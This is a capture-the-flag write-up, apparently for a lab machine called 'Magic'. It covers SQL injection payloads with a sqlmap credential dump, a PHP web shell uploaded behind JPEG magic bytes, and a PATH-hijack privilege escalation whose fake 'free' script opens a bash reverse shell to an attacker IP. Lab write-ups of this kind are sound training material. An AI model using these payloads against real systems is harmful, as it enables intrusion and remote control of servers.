## Magic

### Lab Details 

- Difficulty: Medium
- Type: Web Enumeration, SQLi, Priv Esc, Linux

#### Enumeration 
- run `nmap`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
```
- visiting port 80 we are presented with a image portfolio and at the bottom of the page sits a link to the login page
![[Medium/Unix/Magic/home page.png]]
- `login.php`
![[Medium/Unix/Magic/login.png]]
- use `ffuf` to enumerate the endpoints
```bash
$ ffuf -u http://10.129.221.164/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -fc 403 -e .php .txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________
 :: Method           : GET
 :: URL              : http://10.129.221.164/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 7ms]
index.php               [Status: 200, Size: 4049, Words: 491, Lines: 60, Duration: 8ms]
login.php               [Status: 200, Size: 4221, Words: 1179, Lines: 118, Duration: 9ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 6ms]
assets                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 2ms]
upload.php              [Status: 302, Size: 2957, Words: 814, Lines: 85, Duration: 8ms]
.                       [Status: 200, Size: 4053, Words: 491, Lines: 60, Duration: 4ms]
:: Progress: [239200/239200] :: Job [1/1] :: 9090 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
```
- from the output we see there is a upload page which means we can upload image to the site however visiting the site requires login 
- inspect the image we see that the upload path for the images `/images/uploads`
 ![[get image file path.png]]
#### Initial Foothold 
- capture the login attempt with `burpsuite` and `copy to file` to save the request to a file
- use `sqlmap` to check if there is any SQLi 
- found SQLi with `sqlmap`, we can use `sqlmap` to map out the database 
```bash
$ sqlmap -r ./login.post --batch --level 5 --risk 3 -D Magic -T login --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.12#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:14:31 /2025-09-25/

[01:14:31] [INFO] parsing HTTP request from './login.post'
[01:14:31] [INFO] resuming back-end DBMS 'mysql' 
[01:14:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-9825' OR 1013=1013-- NsXk&password=123

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: username=123' AND 2066=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- FcDg&password=123
---
[01:14:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL > 5.0.12
[01:14:31] [INFO] fetching columns for table 'login' in database 'Magic'
[01:14:31] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[01:14:31] [INFO] retrieved: 
got a 302 redirect to 'http://10.129.221.164/upload.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
3
[01:14:31] [INFO] retrieved: id
[01:14:31] [INFO] retrieved: username
[01:14:32] [INFO] retrieved: password
[01:14:32] [INFO] fetching entries for table 'login' in database 'Magic'
[01:14:32] [INFO] fetching number of entries for table 'login' in database 'Magic'
[01:14:32] [INFO] retrieved: 1
[01:14:32] [INFO] retrieved: 1
[01:14:32] [INFO] retrieved: Th3s3usW4sK1ng
[01:14:33] [INFO] retrieved: admin
Database: Magic
Table: login
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | Th3s3usW4sK1ng | admin    |
+----+----------------+----------+

[01:14:34] [INFO] table 'Magic.login' dumped to CSV file '/home/ch4os1/.local/share/sqlmap/output/10.129.221.164/dump/Magic/login.csv'
[01:14:34] [INFO] fetched data logged to text files under '/home/ch4os1/.local/share/sqlmap/output/10.129.221.164'
[01:14:34] [WARNING] your sqlmap version is outdated
```
- found user login
- we can attempt to upload a web shell to the app via the upload function
![[Medium/Unix/Magic/file upload.png]]
- if we attempt to upload file with extension like `.php.png` or `.php.jpg` we get below
![[error message.png]]
- web shell payload
```php
$ cat webshell.php.jpg
<?=`$_REQUEST[cmd]`?>
```
- we can attempt to bypass this by adding magic bytes to the beginning of our payload
```bash
$ echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
``` 
- upload the file to app and we get a webshell
![[webshell id.png]]
- check if `python3` is installed on target
![[check python3 installed.png]]
- `python3` is installed, we can use a python reverse shell payload to get the shell, use [revshell](https://www.revshells.com/)
```bash
$ nc -lnvp 9000
listening on [any] 9000 ...
connect to [10.10.14.78] from (UNKNOWN) [10.129.221.164] 51108
www-data@magic:/var/www/Magic/images/uploads$ whoami
whoami
www-data
www-data@magic:/var/www/Magic/images/uploads$ 
```
#### Lateral Movement (If any)
- attempt credential reuse 
```bash
www-data@magic:/var/www/Magic/images/uploads$ su theseus
Password: 
theseus@magic:/var/www/Magic/images/uploads$ whoami
theseus
```
#### Privilege Escalation
- load and run `linpeas.sh`
- found a unknown `SUID` binary that belongs to root
```bash
$ linpeas.sh
<snip>
-rwsr-x--- 1 root users 22K Oct 21  2019 /bin/sysinfo (Unknown SUID binary!)
<snip>
```
- get the plain text in the binary using `strings`
- the binary is executing below binaries
```bash
$ strings /bin/sysinfo
<snip>
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
<snip>
```
- we can attempt to hijacking the path by injecting a directory in the `$PATH` environment variable
```bash
export PATH=/tmp:$PATH
```
- we can then create a malicious `free` binary at `/tmp`
 ```
theseus@magic:/tmp$ cat free
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.14.78/4444 0>&1
theseus@magic:/tmp$ chmod +x free 
theseus@magic:/tmp$ free
theseus@magic:/tmp$ sysinfo
```
- run `sysinfo` and we get shell as root user
```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.78] from (UNKNOWN) [10.129.221.164] 38630
root@magic:/tmp# whoami 
whoami
root
```
#### Resources

#### Lesson Learned
